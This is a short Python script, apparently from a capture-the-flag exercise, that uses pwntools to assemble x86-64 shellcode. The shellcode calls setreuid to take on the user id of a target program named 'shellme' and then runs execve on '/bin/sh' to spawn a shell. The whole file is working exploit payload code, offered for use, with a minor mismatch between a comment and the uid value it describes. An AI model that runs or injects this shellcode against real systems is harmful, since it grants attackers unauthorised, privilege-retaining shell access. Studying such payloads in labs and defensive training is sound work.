from pwn import *

get_shell = '''
        mov ecx, 1008 #FIXME Change 1007 to the effective user id of shellme
        mov edi, ecx
        mov esi, ecx
        mov rax, 113
        syscall #note that if DEBUG==True, this syscall will fail (rax will be set to a value < 0)
    
        mov     rbx,0x68732f6e69622f2f
        shr     rbx,0x8
        push    rbx
        mov     rdi,rsp
        xor     rdx,rdx ;rdx=0
        push    rdx
        push    rdi
        mov     rsi,rsp
        xor     rax,rax
        mov     al,0x3b
        syscall
'''

payload = asm(get_shell)

print(payload)
